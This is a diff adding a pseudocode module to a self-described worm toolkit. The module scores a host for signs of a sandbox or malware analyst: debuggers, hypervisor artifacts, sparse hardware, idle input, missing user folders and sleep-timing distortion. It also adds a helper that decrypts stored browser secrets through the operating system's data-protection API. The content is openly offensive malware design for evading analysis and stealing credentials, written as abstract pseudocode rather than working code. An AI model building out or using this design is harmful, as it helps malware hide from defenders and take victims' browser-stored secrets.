@@ -1,0 +1,54 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/host_profile.pseudo
+# Sandbox / analyst scoring and small Windows helpers.
+
+FUNCTION score_machine() -> (0..100, list of reasons):
+    score = 0
+
+    # Process list
+    FOR each running process name, lowercased:
+        IF looks like a debugger:          score += LARGE
+        IF looks like a traffic/proc sniffer: score += SMALL
+        IF looks like a hypervisor guest tool: score += TINY
+
+    # Hardware
+    IF cpu_count < 2:     score += MEDIUM
+    IF ram_mb < 2048:     score += LARGE
+    IF free_disk_C < 40GB: score += MEDIUM
+
+    # Registry guest artifacts (hypervisor vendors)
+    IF any guest-tool key exists: score += SMALL each
+
+    # Human-use signals
+    IF last input older than several minutes: score += SMALL
+    IF fewer than two of Desktop/Documents/Downloads exist: score += LARGE
+    ELSE IF all three exist: score -= MEDIUM
+    IF many recently modified user files: score -= LARGE
+    IF none: score += MEDIUM
+    IF a browser process is running: score -= SMALL
+
+    # Timing: sleep 1ms, if elapsed >> real time, likely sandbox
+    IF sleep_distorted: score += MEDIUM
+
+    # Outbound HTTPS to a well-known site
+    IF unreachable: score += MEDIUM ELSE score -= TINY
+
+    # CPUID hypervisor-present bit (x86_64 only)
+    IF set: score += SMALL
+
+    RETURN clamp(score, 0, 100), reasons
+
+FUNCTION unprotect_blob(bytes) -> string | error:
+    # OS data-protection API, same-user context
+    # Sufficient for older browser blobs; not sufficient for
+    # modern app-bound / versioned browser encryption.
+
+FUNCTION machine_guid() -> optional string
+FUNCTION username() -> optional string
+FUNCTION expand_env(template) -> string
+FUNCTION pids_named(list of names) -> list of (pid, name)
